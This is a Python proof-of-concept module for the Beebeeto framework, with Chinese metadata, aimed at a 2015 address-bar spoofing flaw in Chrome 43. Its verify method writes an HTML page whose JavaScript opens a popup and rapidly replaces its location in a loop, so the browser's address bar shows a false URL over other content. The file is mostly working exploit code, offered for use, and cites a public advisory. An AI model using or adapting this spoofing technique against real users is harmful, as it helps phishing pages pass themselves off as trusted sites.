#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0119',
            'name': 'Google Chrome (43.0.2357) 地址栏欺骗漏洞 PoC',
            'author': '雷蜂',
            'create_date': '2015-07-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Google',
            'vul_version': ['43.0.2357'],
            'type': 'Other',
            'tag': ['Google Chrome漏洞', 'URL地址栏欺骗漏洞'],
            'desc': 'Google Chrome Address Spoofing (Request For Comment)',
            'references': ['http://seclists.org/fulldisclosure/2015/Jul/8',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        temp = '''
        <script>
        // Chrome 43.0.2357.130
        function next(){
            w.location.replace('http://www.baidu.com/?'+n);n++;
            setTimeout("next();",10);
            setTimeout("next();",25);
        }

        function f(){
            w=window.open("content.html","_blank","width=700 height=700");
            i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
        }
        </script>

        <a href="#" onclick="f()">Beebeeto-%s</a><br>
        ''' % verify_url
        test_html = open('./chrome_test.html', 'w')
        test_html.write(temp)
        test_html.close()
        content_html = open('./content.html', 'w')
        content_html.write('Are false, beebeeto.')
        content_html.close()
        args['poc_ret']['vul_url'] = 'Generation ok: ./chrome_test.html & ./content.html'
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())